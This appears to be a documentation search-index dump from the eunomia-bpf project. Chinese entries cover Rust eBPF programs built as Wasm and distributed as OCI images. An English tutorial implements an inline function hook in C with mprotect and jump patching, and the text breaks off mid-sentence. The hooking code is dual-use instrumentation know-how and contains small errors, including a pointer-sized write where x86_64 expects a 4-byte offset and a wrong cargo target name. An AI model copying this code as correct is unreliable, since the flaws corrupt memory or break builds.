\u7a0b\u5e8f\u7684\u4ee3\u7801\uff0c\u4e00\u822c\u4f7f\u7528 C/C++ \u6216 Rust \u8bed\u8a00</li> <li>\u4f7f\u7528 clang \u7f16\u8bd1\u5668\u6216\u8005\u76f8\u5173\u5de5\u5177\u94fe\u7f16\u8bd1 eBPF \u7a0b\u5e8f\uff08\u8981\u5b9e\u73b0\u8de8\u5185\u6838\u7248\u672c\u79fb\u690d\u7684\u8bdd\uff0c\u9700\u8981\u5305\u542b BTF \u4fe1\u606f\uff09\u3002</li> <li>\u5728\u7528\u6237\u6001\u7684\u5f00\u53d1\u7a0b\u5e8f\u4e2d\uff0c\u7f16\u5199\u5bf9\u5e94\u7684\u52a0\u8f7d\u3001\u63a7\u5236\u3001\u6302\u8f7d\u3001\u6570\u636e\u5904\u7406\u903b\u8f91\uff1b</li> <li>\u5728\u5b9e\u9645\u8fd0\u884c\u7684\u9636\u6bb5\uff0c\u4ece\u7528\u6237\u6001\u5c06 eBPF \u7a0b\u5e8f\u52a0\u8f7d\u8fdb\u5165\u5185\u6838\uff0c\u5e76\u5b9e\u9645\u6267\u884c\u3002</li> </ul>"},{"location":"blogs/how-to-write-rust-in-wasm/#rust-ebpf-wasm","title":"\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm","text":"<p>Rust \u53ef\u80fd\u662f WebAssembly \u751f\u6001\u7cfb\u7edf\u4e2d\u652f\u6301\u6700\u597d\u7684\u8bed\u8a00\u3002Rust \u4e0d\u4ec5\u652f\u6301\u51e0\u4e2a WebAssembly \u7f16\u8bd1\u76ee\u6807\uff0c\u800c\u4e14 wasmtime\u3001Spin\u3001Wagi \u548c\u5176\u4ed6\u8bb8\u591a WebAssembly \u5de5\u5177\u90fd\u662f\u7528 Rust \u7f16\u5199\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86 Rust \u7684\u5f00\u53d1\u793a\u4f8b\uff1a</p> <ul> <li>Wasm \u548c WASI \u7684 Rust \u751f\u6001\u7cfb\u7edf\u975e\u5e38\u68d2</li> <li>\u8bb8\u591a Wasm \u5de5\u5177\u90fd\u662f\u7528 Rust \u7f16\u5199\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6709\u5927\u91cf\u7684\u4ee3\u7801\u53ef\u4ee5\u590d\u7528\u3002</li> <li>Spin \u901a\u5e38\u5728\u5bf9\u5176\u4ed6\u8bed\u8a00\u7684\u652f\u6301\u4e4b\u524d\u5c31\u6709Rust\u7684\u529f\u80fd\u652f\u6301</li> <li>Wasmtime \u662f\u7528 Rust\u7f16\u5199\u7684\uff0c\u901a\u5e38\u5728\u5176\u4ed6\u8fd0\u884c\u65f6\u4e4b\u524d\u5c31\u6709\u6700\u5148\u8fdb\u7684\u529f\u80fd\u3002</li> <li>\u53ef\u4ee5\u5728 WebAssembly \u4e2d\u4f7f\u7528\u8bb8\u591a\u73b0\u6210\u7684 Rust \u5e93\u3002</li> <li>\u7531\u4e8e Cargo \u7684\u7075\u6d3b\u6784\u5efa\u7cfb\u7edf\uff0c\u4e00\u4e9b Crates \u751a\u81f3\u6709\u7279\u6b8a\u7684\u529f\u80fd\u6807\u5fd7\u6765\u542f\u7528Wasm\u7684\u529f\u80fd\uff08\u4f8b\u5982Chrono\uff09\u3002</li> <li>\u7531\u4e8e Rust \u7684\u5185\u5b58\u7ba1\u7406\u6280\u672f\uff0c\u4e0e\u540c\u7c7b\u8bed\u8a00\u76f8\u6bd4\uff0cRust \u7684\u4e8c\u8fdb\u5236\u5927\u5c0f\u5f88\u5c0f\u3002</li> </ul> <p>\u6211\u4eec\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u4e2a Rust \u7684 eBPF SDK\uff0c\u53ef\u4ee5\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7684\u7528\u6237\u6001\u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm\u3002\u501f\u52a9 aya-rs \u63d0\u4f9b\u7684\u76f8\u5173\u5de5\u5177\u94fe\u652f\u6301\uff0c\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u7528 Rust \u8fdb\u884c\u7f16\u5199\uff0c\u4e0d\u8fc7\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd8\u662f\u590d\u7528\u4e4b\u524d\u4f7f\u7528 C \u8bed\u8a00\u7f16\u5199\u7684\u5185\u6838\u6001\u7a0b\u5e8f\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 rust \u63d0\u4f9b\u7684 wasi \u5de5\u5177\u94fe\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9879\u76ee\uff1a</p> <pre><code>rustup target add wasm32-wasi\ncargo new rust-helloworld\n</code></pre> <p>\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>Makefile</code> \u8fd0\u884c make \u5b8c\u6210\u6574\u4e2a\u7f16\u8bd1\u6d41\u7a0b\uff0c\u5e76\u751f\u6210 <code>bootstrap.bpf.o</code> eBPF \u5b57\u8282\u7801\u6587\u4ef6\u3002</p>"},{"location":"blogs/how-to-write-rust-in-wasm/#wit-bindgen-wasm","title":"\u4f7f\u7528 wit-bindgen \u751f\u6210\u7c7b\u578b\u4fe1\u606f\uff0c\u7528\u4e8e\u5185\u6838\u6001\u548c Wasm \u6a21\u5757\u4e4b\u95f4\u901a\u4fe1","text":"<p>wit-bindgen \u9879\u76ee\u662f\u4e00\u5957\u7740\u773c\u4e8e WebAssembly\uff0c\u5e76\u4f7f\u7528\u7ec4\u4ef6\u6a21\u578b\u7684\u8bed\u8a00\u7684\u7ed1\u5b9a\u751f\u6210\u5668\u3002\u7ed1\u5b9a\u662f\u7528 *.wit \u6587\u4ef6\u63cf\u8ff0\u7684\uff0c\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86 Wasm \u6a21\u5757\u5bfc\u5165\u3001\u5bfc\u51fa\u7684\u51fd\u6570\u548c\u63a5\u53e3\u3002\u6211\u4eec\u53ef\u4ee5 wit-bindgen \u5b83\u6765\u751f\u6210\u591a\u79cd\u8bed\u8a00\u7684\u7c7b\u578b\u5b9a\u4e49\uff0c\u4ee5\u4fbf\u5728\u5185\u6838\u6001\u7684 eBPF \u548c\u7528\u6237\u6001\u7684 Wasm \u6a21\u5757\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u3002</p> <p>\u6211\u4eec\u9996\u5148\u9700\u8981\u5728 <code>Cargo.toml</code> \u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 <code>wasm-bpf-binding</code> \u548c <code>wit-bindgen-guest-rust</code> \u4f9d\u8d56\uff1a</p> <pre><code>wasm-bpf-binding = { path = \"wasm-bpf-binding\" }\n</code></pre> <p>\u8fd9\u4e2a\u5305\u63d0\u4f9b\u4e86 wasm-bpf \u7531\u8fd0\u884c\u65f6\u63d0\u4f9b\u7ed9 Wasm \u6a21\u5757\uff0c\u7528\u4e8e\u52a0\u8f7d\u548c\u63a7\u5236 eBPF \u7a0b\u5e8f\u7684\u51fd\u6570\u7684\u7ed1\u5b9a\u3002</p> <ul> <li><code>wasm-bpf-binding</code> \u5728 wasm-bpf \u4ed3\u5e93\u4e2d\u6709\u63d0\u4f9b\u3002</li> </ul> <pre><code>[dependencies]\nwit-bindgen-guest-rust = { git = \"https://github.com/bytecodealliance/wit-bindgen\", version = \"0.3.0\" }\n\n[patch.crates-io]\nwit-component = {git = \"https://github.com/bytecodealliance/wasm-tools\", version = \"0.5.0\", rev = \"9640d187a73a516c42b532cf2a10ba5403df5946\"}\nwit-parser = {git = \"https://github.com/bytecodealliance/wasm-tools\", version = \"0.5.0\", rev = \"9640d187a73a516c42b532cf2a10ba5403df5946\"}\n</code></pre> <p>\u8fd9\u4e2a\u5305\u652f\u6301\u7528 wit \u6587\u4ef6\u4e3a rust \u5ba2\u6237\u7a0b\u5e8f\u751f\u6210\u7ed1\u5b9a\u3002\u4f7f\u7528\u8fd9\u4e2a\u5305\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u518d\u624b\u52a8\u8fd0\u884c wit-bindgen\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f7f\u7528 <code>btf2wit</code> \u5de5\u5177\uff0c\u4ece BTF \u4fe1\u606f\u751f\u6210 wit \u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528 <code>cargo install btf2wit</code> \u5b89\u88c5\u6211\u4eec\u63d0\u4f9b\u7684 btf2wit \u5de5\u5177\uff0c\u5e76\u7f16\u8bd1\u751f\u6210 wit \u4fe1\u606f\uff1a</p> <pre><code>cd btf\nclang -target bpf -g event-def.c -c -o event.def.o\nbtf2wit event.def.o -o event-def.wit\ncp *.wit ../wit/\n</code></pre> <ul> <li>\u5176\u4e2d <code>event-def.c</code> \u662f\u5305\u542b\u4e86\u6211\u4eec\u9700\u8981\u7684\u7ed3\u6784\u4f53\u4fe1\u606f\u7684\u7684 C \u7a0b\u5e8f\u6587\u4ef6\u3002\u53ea\u6709\u5728\u5bfc\u51fa\u7b26\u53f7\u4e2d\u7528\u5230\u7684\u7ed3\u6784\u4f53\u624d\u4f1a\u88ab\u8bb0\u5f55\u5728 BTF \u4e2d\u3002</li> </ul> <p>\u5bf9\u4e8e C \u7ed3\u6784\u4f53\u751f\u6210\u7684 wit \u4fe1\u606f\uff0c\u5927\u81f4\u5982\u4e0b\uff1a</p> <pre><code>default world host {\n    record event {\n         pid: s32,\n        ppid: s32,\n        exit-code: u32,\n        --pad0: list&lt;s8&gt;,\n        duration-ns: u64,\n        comm: list&lt;s8&gt;,\n        filename: list&lt;s8&gt;,\n        exit-event: s8,\n    }\n}\n</code></pre> <p><code>wit-bindgen-guest-rust</code> \u4f1a\u4e3a wit \u6587\u4ef6\u5939\u4e2d\u7684\u6240\u6709\u7c7b\u578b\u4fe1\u606f\uff0c\u81ea\u52a8\u751f\u6210 rust \u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a</p> <pre><code>#[repr(C, packed)]\n#[derive(Debug, Copy, Clone)]\nstruct Event {\n    pid: i32,\n    ppid: i32,\n    exit_code: u32,\n    __pad0: [u8; 4],\n    duration_ns: u64,\n    comm: [u8; 16],\n    filename: [u8; 127],\n    exit_event: u8,\n}\n</code></pre>"},{"location":"blogs/how-to-write-rust-in-wasm/#_1","title":"\u7f16\u5199\u7528\u6237\u6001\u52a0\u8f7d\u548c\u5904\u7406\u4ee3\u7801","text":"<p>\u4e3a\u4e86\u5728 WASI \u4e0a\u8fd0\u884c\uff0c\u9700\u8981\u4e3a main.rs \u6dfb\u52a0 <code>#![no_main]</code> \u5c5e\u6027\uff0c\u5e76\u4e14 main \u51fd\u6570\u9700\u8981\u91c7\u7528\u7c7b\u4f3c\u5982\u4e0b\u7684\u5f62\u6001\uff1a</p> <pre><code>#[export_name = \"__main_argc_argv\"]\nfn exam_main(_env_json: u32, _str_len: i32) -&gt; i32 {\n\n    return 0;\n}\n</code></pre> <p>\u7528\u6237\u6001\u52a0\u8f7d\u548c\u6302\u8f7d\u4ee3\u7801\uff0c\u548c C/C++ \u4e2d\u7c7b\u4f3c\uff1a</p> <p>```rust,ignore     let obj_ptr =         binding::wasm_load_bpf_object(bpf_object.as_ptr() as u32, bpf_object.len() as i32);     if obj_ptr == 0 {         println!(\"Failed to load bpf object\");         return 1;     }     let attach_result = binding::wasm_attach_bpf_program(         obj_ptr,         \"handle_exec\\0\".as_ptr() as u32,         \"\\0\".as_ptr() as u32,     );     .. <pre><code>polling ring buffer\uff1a\n\n```rust,ignore\n    let map_fd = binding::wasm_bpf_map_fd_by_name(obj_ptr, \"rb\\0\".as_ptr() as u32);\n    if map_fd &lt; 0 {\n        println!(\"Failed to get map fd: {}\", map_fd);\n        return 1;\n    }\n    // binding::wasm\n    let buffer = [0u8; 256];\n    loop {\n        // polling the buffer\n        binding::wasm_bpf_buffer_poll(\n            obj_ptr,\n            map_fd,\n            handle_event as i32,\n            0,\n            buffer.as_ptr() as u32,\n            buffer.len() as i32,\n            100,\n        );\n    }\n</code></pre></p> <p>\u4f7f\u7528 handler \u63a5\u6536\u8fd4\u56de\u503c\uff1a</p> <p>```rust,ignore</p> <p>extern \"C\" fn handle_event(_ctx: u32, data: u32, _data_sz: u32) {     let event_slice = unsafe { slice::from_raw_parts(data as const Event, 1) };     let event = &amp;event_slice[0];     let pid = event.pid;     let ppid = event.ppid;     let exit_code = event.exit_code;     if event.exit_event == 1 {         print!(             \"{:&lt;8} {:&lt;5} {:&lt;16} {:&lt;7} {:&lt;7} [{}]\",             \"TIME\",             \"EXIT\",             unsafe { CStr::from_ptr(event.comm.as_ptr() as const i8) }                 .to_str()                 .unwrap(),             pid,             ppid,             exit_code         );         .. } <pre><code>\u63a5\u4e0b\u6765\u5373\u53ef\u4f7f\u7528 cargo \u7f16\u8bd1\u8fd0\u884c\uff1a\n\n```console\n$ cargo build --target wasi32-wasm\n$ sudo wasm-bpf ./target/wasm32-wasi/debug/rust-helloworld.wasm\nTIME     EXEC  sh               180245  33666   /bin/sh\nTIME     EXEC  which            180246  180245  /usr/bin/which\nTIME     EXIT  which            180246  180245  [0] (1ms)\nTIME     EXIT  sh               180245  33666   [0] (3ms)\nTIME     EXEC  sh               180247  33666   /bin/sh\nTIME     EXEC  ps               180248  180247  /usr/bin/ps\nTIME     EXIT  ps               180248  180247  [0] (23ms)\nTIME     EXIT  sh               180247  33666   [0] (25ms)\nTIME     EXEC  sh               180249  33666   /bin/sh\nTIME     EXEC  cpuUsage.sh      180250  180249  /root/.vscode-server-insiders/bin/a7d49b0f35f50e460835a55d20a00a735d1665a3/out/vs/base/node/cpuUsage.sh\n</code></pre></p>"},{"location":"blogs/how-to-write-rust-in-wasm/#oci-ebpf","title":"\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f","text":"<p>\u5f00\u653e\u5bb9\u5668\u534f\u8bae (OCI) \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\uff0c\u5f00\u653e\u7684\u6cbb\u7406\u7ed3\u6784\uff0c\u4e3a\u5bb9\u5668\u6280\u672f\u5b9a\u4e49\u4e86\u89c4\u8303\u548c\u6807\u51c6\u3002\u5728 Linux \u57fa\u91d1\u4f1a\u7684\u652f\u6301\u4e0b\u6210\u7acb\uff0c\u7531\u5404\u5927\u8f6f\u4ef6\u4f01\u4e1a\u6784\u6210\uff0c\u81f4\u529b\u4e8e\u56f4\u7ed5\u5bb9\u5668\u683c\u5f0f\u548c\u8fd0\u884c\u65f6\u521b\u5efa\u5f00\u653e\u7684\u884c\u4e1a\u6807\u51c6\u3002\u5176\u4e2d\u5305\u62ec\u4e86\u4f7f\u7528 Container Registries \u8fdb\u884c\u5de5\u4f5c\u7684 API\uff0c\u6b63\u5f0f\u540d\u79f0\u4e3a OCI \u5206\u53d1\u89c4\u8303 (\u53c8\u540d\u201cdistribution-spec\u201d)\u3002</p> <p>Docker \u4e5f\u5ba3\u5e03\u63a8\u51fa\u4e0e WebAssembly \u96c6\u6210 (Docker+Wasm) \u7684\u9996\u4e2a\u6280\u672f\u9884\u89c8\u7248\uff0c\u5e76\u8868\u793a\u516c\u53f8\u5df2\u52a0\u5165\u5b57\u8282\u7801\u8054\u76df (Bytecode Alliance)\uff0c\u6210\u4e3a\u6295\u7968\u6210\u5458\u3002Docker+Wasm \u8ba9\u5f00\u53d1\u8005\u80fd\u591f\u66f4\u5bb9\u6613\u5730\u5feb\u901f\u6784\u5efa\u9762\u5411 Wasm \u8fd0\u884c\u65f6\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u501f\u52a9\u4e8e Wasm \u7684\u76f8\u5173\u751f\u6001\uff0c\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u53d1\u5e03\u3001\u4e0b\u8f7d\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u4f8b\u5982\uff0c\u4f7f\u7528 <code>wasm-to-oci</code> \u5de5\u5177\uff0c\u53ef\u4ee5\u5c06 Wasm \u7a0b\u5e8f\u6253\u5305\u4e3a OCI \u955c\u50cf\uff0c\u83b7\u53d6\u7c7b\u4f3c docker \u7684\u4f53\u9a8c\uff1a</p> <pre><code>wasm-to-oci push testdata/hello.wasm &lt;oci-registry&gt;.azurecr.io/wasm-to-oci:v1\nwasm-to-oci pull &lt;oci-registry&gt;.azurecr.io/wasm-to-oci:v1 --out test.wasm\n</code></pre> <p>\u6211\u4eec\u4e5f\u5c06\u5176\u96c6\u6210\u5230\u4e86 eunomia-bpf \u7684 ecli \u5de5\u5177\u4e2d\uff0c\u53ef\u4ee5\u4e00\u884c\u547d\u4ee4\u4ece\u4e91\u7aef\u7684 Github Packages \u4e2d\u4e0b\u8f7d\u5e76\u8fd0\u884c eBPF \u7a0b\u5e8f\uff0c\u6216\u901a\u8fc7 Github Packages \u53d1\u5e03\uff1a</p> <pre><code># push to Github Packages\necli push https://ghcr.io/eunomia-bpf/sigsnoop:latest\n# pull from Github Packages\necli pull https://ghcr.io/eunomia-bpf/sigsnoop:latest\n# run eBPF program\necli run https://ghcr.io/eunomia-bpf/sigsnoop:latest\n</code></pre> <p>\u6211\u4eec\u5df2\u7ecf\u5728 LMP \u9879\u76ee\u7684 eBPF Hub \u4e2d\uff0c\u6709\u4e00\u4e9b\u521b\u5efa\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm-eBPF \u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 eBPF \u5e94\u7528\u5f00\u53d1\uff0c\u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\u7684\u5c1d\u8bd5[11]\uff0c\u4ee5\u53ca\u57fa\u4e8e Wasm \u540c\u65f6\u4f7f\u7528\u591a\u79cd\u4e0d\u540c\u8bed\u8a00\u5f00\u53d1 eBPF \u7684\u7528\u6237\u6001\u6570\u636e\u5904\u7406\u63d2\u4ef6\u7684\u5b9e\u8df5\u3002\u57fa\u4e8e\u6700\u65b0\u7684 Wasm-bpf \u6846\u67b6\uff0c\u6709\u66f4\u591a\u7684\u63a2\u7d22\u6027\u5de5\u4f5c\u53ef\u4ee5\u7ee7\u7eed\u5c55\u5f00\uff0c\u6211\u4eec\u5e0c\u671b\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684\u9488\u5bf9 eBPF \u548c Wasm \u7a0b\u5e8f\u7684\u5305\u7ba1\u7406\u7cfb\u7edf\uff0c\u4ee5\u53ca\u66f4\u591a\u7684\u53ef\u4ee5\u63a2\u7d22\u7684\u5e94\u7528\u573a\u666f\u3002</p>"},{"location":"blogs/how-to-write-rust-in-wasm/#_2","title":"\u603b\u7ed3","text":"<p>\u672c\u6587\u4ee5 Rust \u8bed\u8a00\u4e3a\u4f8b\uff0c\u8ba8\u8bba\u4e86\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757\u4ee5\u53ca\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u3001\u90e8\u7f72\u3001\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u83b7\u5f97\u7c7b\u4f3c Docker \u7684\u4f53\u9a8c\u3002\u66f4\u5b8c\u6574\u7684\u4ee3\u7801\uff0c\u8bf7\u53c2\u8003\u6211\u4eec\u7684 Github \u4ed3\u5e93\uff1ahttps://github.com/eunomia-bpf/wasm-bpf.</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f1a\u7ee7\u7eed\u5b8c\u5584\u5728 Wasm \u4e2d\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\u5f00\u53d1\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\u7684\u4f53\u9a8c\uff0c\u63d0\u4f9b\u66f4\u5b8c\u5584\u7684\u793a\u4f8b\u548c\u7528\u6237\u6001\u5f00\u53d1\u5e93/\u5de5\u5177\u94fe\uff0c\u4ee5\u53ca\u66f4\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\u3002</p>"},{"location":"blogs/how-to-write-rust-in-wasm/#_3","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>wasm-bpf Github \u5f00\u6e90\u5730\u5740\uff1ahttps://github.com/eunomia-bpf/wasm-bpf</li> <li>\u4ec0\u4e48\u662f eBPF\uff1ahttps://ebpf.io/what-is-ebpf</li> <li>WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>\u9f99\u8725\u793e\u533a eBPF \u6280\u672f\u63a2\u7d22 SIG https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf \u9879\u76ee\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf</li> <li>eunomia-bpf \u9879\u76ee\u9f99\u8725 Gitee \u955c\u50cf\uff1ahttps://gitee.com/anolis/eunomia</li> <li>Wasm-bpf: \u67b6\u8d77 Webassembly \u548c eBPF \u5185\u6838\u53ef\u7f16\u7a0b\u7684\u6865\u6881\uff1ahttps://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>\u5f53 Wasm \u9047\u89c1 eBPF \uff1a\u4f7f\u7528 WebAssembly \u7f16\u5199\u3001\u5206\u53d1\u3001\u52a0\u8f7d\u8fd0\u884c eBPF \u7a0b\u5e8f\uff1ahttps://zhuanlan.zhihu.com/p/573941739</li> <li>Docker+Wasm\u6280\u672f\u9884\u89c8\uff1ahttps://zhuanlan.zhihu.com/p/583614628</li> <li>LMP eBPF-Hub: https://github.com/linuxkerneltravel/lmp</li> <li>wasm-to-oci: https://github.com/engineerd/wasm-to-oci</li> <li>btf2wit: https://github.com/eunomia-bpf/btf2wit</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/inline-hook/","title":"Implementing an Inline Hook in C in 5 minutes","text":"<p>One of the fascinating aspects of programming comes when we try to alter the behavior of a program while it is running.</p> <p>In this tutorial, we shed light on one method that can make this possible - an \"Inline Hook\". We will delve into how you can manipulate the execution flow of a program in the C programming language. By implementing an Inline Hook, we aim to divert the program's execution flow to our function, then returning it back to the normal flow.</p>"},{"location":"blogs/inline-hook/#what-is-an-inline-hook","title":"What is an Inline Hook?","text":"<p>An Inline hook is a technique that inserts a piece of code into a running program, altering its control flow. In practice, this is achieved by replacing the first few instructions of a function with a jump to our inserted code (usually another function), which upon completion will jump back, continuing the execution of the original function. Frida is a popular tool that uses this technique to inject code into a running process. It is used for dynamic instrumentation, debugging, and reverse engineering.</p> <p>In our userspace eBPF runtime bpftime (https://github.com/eunomia-bpf/bpftime), we use inline hooking to implement the <code>uprobe</code> feature. bpftime is an userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts.</p>"},{"location":"blogs/inline-hook/#inline-hook-implementation","title":"Inline Hook Implementation","text":"<p>The Inline hook implementation primarily follows five crucial steps:</p> <ol> <li>Identifying the memory address of the function to be hooked.</li> <li>Backing up the initial instructions of the target function that will be overwritten,</li> <li>Writing a jump instruction at the beginning of the target function in the hooked process's memory,</li> <li>Creating the hook function, which will replace the original one,</li> <li>Altering the memory permissions to enable the changes, and restoring them once modifications are complete.</li> </ol> <p>On a side note, Inline Hooking could be limited by modern compiler optimization and certain memory protection procedures such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).</p>"},{"location":"blogs/inline-hook/#inline-hooking-example-how-to-use-it","title":"Inline Hooking Example: how to use it","text":"<p>To make this more digestible, we will use an example scenario. In this example, we will hook a simple function <code>my_function</code>. This code is in <code>main.c</code> and it initially prints \"Hello, world!\". But after applying our hook, it prints \"Hello from hook!\" instead.</p> <pre><code>// This is the original function to hook.\nvoid my_function()\n{\n    printf(\"Hello, world!\\n\");\n}\n</code></pre> <p>Next, we create a hooking function <code>my_hook_function</code> in <code>hook.c</code>. This function will replace <code>my_function</code> and is designed to print \"Hello from hook!\"</p> <pre><code>// This is the hook function.\nvoid my_hook_function()\n{\n    printf(\"Hello from hook!\\n\");\n}\n</code></pre> <p>The <code>inline_hook</code> function is the most critical part of our application. It uses <code>mprotect</code> to change the memory permissions of the target function, making it writable. It then replaces the first few instructions of <code>my_function</code> with a jump instruction to <code>my_hook_function</code>. The original bytes are saved for future restoration.</p> <p>On the main function, we start by calling <code>my_function</code>, enabling the <code>inline_hook</code>, calling <code>my_function</code> again (which now executes <code>my_hook_function</code>), then removing the hook and calling <code>my_function</code> another time to see that it prints the original \"Hello, world!\" string.</p> <pre><code>int main()\n{\n    my_function();\n\n    // Enabling the hook.\n    inline_hook(my_function, my_hook_function);\n\n    // Now calling the function will actually call the hook function.\n    my_function();\n\n    // Removing the hook\n    remove_hook(my_function);\n\n    // Now calling the function will call the original function.\n    my_function();\n\n    return 0;\n}\n</code></pre> <p>After compiling and running the main function, we can observe the output.</p> <pre><code>$ make\n$ ./maps\nHello, world!\nHello from hook!\nHello, world!\n</code></pre> <p>You can find the complete example in the following repository: https://github.com/eunomia-bpf/inline-hook-demo</p>"},{"location":"blogs/inline-hook/#implementation-a-inline-hook","title":"Implementation a inline hook","text":"<p>Let's take a look at the implementation of the <code>inline_hook</code> function. This is a very basic implementation that works on x86_64, ARM64, and ARM32. It is not a complete implementation, but it should be enough to get you started.</p> <pre><code>#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define SIZE_ORIG_BYTES 16\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n        // Write a jump instruction at the start of the original function.\n    *((unsigned char *)orig_func + 0) = 0xE9; // JMP instruction\n    *((void **)((unsigned char *)orig_func + 1)) =\n        (unsigned char *)hook_func - (unsigned char *)orig_func - 5;\n}\n#elif defined(__aarch64__) || defined(_M_ARM64)\n#define SIZE_ORIG_BYTES 32\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func) / 4;\n    if (offset &lt; -0x2000000 || offset &gt; 0x1ffffff) {\n        printf(\"Offset %d out of range!\\n\", offset);\n        exit(1);\n    }\n    uint32_t branch_instruction = 0x14000000 | (offset &amp; 0x03ffffff);\n    *((uint32_t*)orig_func) = branch_instruction;\n}\n#elif defined(__arm__) || defined(_M_ARM)\n#define SIZE_ORIG_BYTES 20\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    // Construct a branch instruction to the hook function.\n    // The instruction for a branch in ARM is 0xEA000000 | ((&lt;offset&gt; / 4) &amp; 0x00FFFFFF)\n    // The offset needs to be divided by 4 because the PC advances by 4 bytes each step in ARM\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func - 8) / 4;\n    int branch_instruction = 0xEA000000 | (offset &amp; 0x00FFFFFF);\n\n    // Write the branch instruction to the start of the original function.\n    *(int *)orig_func = branch_instruction;\n}\n#else\n#error \"Unsupported architecture\"\n#endif\n\nvoid *get_page_addr(void *addr)\n{\n    return (void *)((uintptr_t)addr &amp; ~(getpagesize() - 1));\n}\n\nunsigned char orig_bytes[SIZE_ORIG_BYTES];\n\nvoid inline_hook(void *orig_func, void *hook_func)\n{\n    // Store the original bytes of the function.\n    memcpy(orig_bytes, orig_func, SIZE_ORIG_BYTES);\n\n    // Make the memory page writable.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_WRITE | PROT_EXEC);\n\n    inline_hook_replace_inst(orig_func, hook_func);\n\n    // Make the memory page executable only.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_EXEC);\n}\n\nvoid remove_hook(void *orig_func)\n{\n    // Make the memory page writable.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_WRITE | PROT_EXEC);\n\n    // Restore the original bytes of the function.\n    memcpy(orig_func, orig_bytes, SIZE_ORIG_BYTES);\n\n    // Make the memory page executable only.\n    mprotect(get_page_addr(orig_func), getpagesize(),\n         PROT_READ | PROT_EXEC);\n}\n</code></pre> <p>We start by saving the original bytes of the target function in the <code>orig_bytes</code> array. We then make the memory page writable using <code>mprotect</code>. Next, we replace the first few instructions of the target function with a jump instruction to the hook function. Finally, we restore the memory page's permissions to their original state. <code>get_page_addr</code> computes the page-aligned address. <code>inline_hook</code> sets up the hook by storing original bytes and modifying instructions. <code>remove_hook</code> reverses the changes.</p> <p>The hook installation differs based on the processor architecture.</p> <p>On x86_64, we replace the beginning of the target function with a <code>JMP</code> instruction that redirects to our hook function.</p> <pre><code>#define SIZE_ORIG_BYTES 16\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    // Write a jump instruction at the start of the original function.\n    *((unsigned char *)orig_func + 0) = 0xE9; // JMP instruction\n    *((void **)((unsigned char *)orig_func + 1)) =\n        (unsigned char *)hook_func - (unsigned char *)orig_func - 5;\n}\n</code></pre> <p>Note that in ARM32, the Program Counter (PC) is usually 2 instructions ahead, which is why we subtract 8 (2 instructions * 4 bytes/instruction) when calculating the offset. This might differ between different ARM versions or modes (Thumb vs ARM, etc.) so please adjust accordingly to your target's specifics.</p> <p>Also, you need to increase the SIZE_ORIG_BYTES from 16 to 20 because the minimal branch instruction in ARM is 